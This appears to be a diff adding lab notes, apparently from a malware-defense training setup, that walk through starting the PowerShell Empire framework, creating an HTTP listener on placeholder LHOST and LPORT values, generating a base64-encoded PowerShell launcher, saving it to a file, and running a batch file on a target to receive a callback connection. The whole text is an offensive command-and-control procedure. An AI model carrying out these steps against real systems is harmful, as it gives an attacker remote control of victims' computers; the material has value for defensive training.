@@ -1,0 +1,19 @@
+cd /opt/Empire
+./empire 
+listeners
+uselistener http 
+set Host <LHOST>
+set Port <LPORT>
+set Name http 
+execute
+back 
+launcher powershell http 
+(Copy all of the base64 encoded data. It is the data following -enc)
+
+In another window 
+cd /opt/malwaredefense/current
+nano 762-Empire.b64
+(Paste copied base64 string and save)
+
+(Launch Batch file on target computer and wait for a connection within Empire) 
+
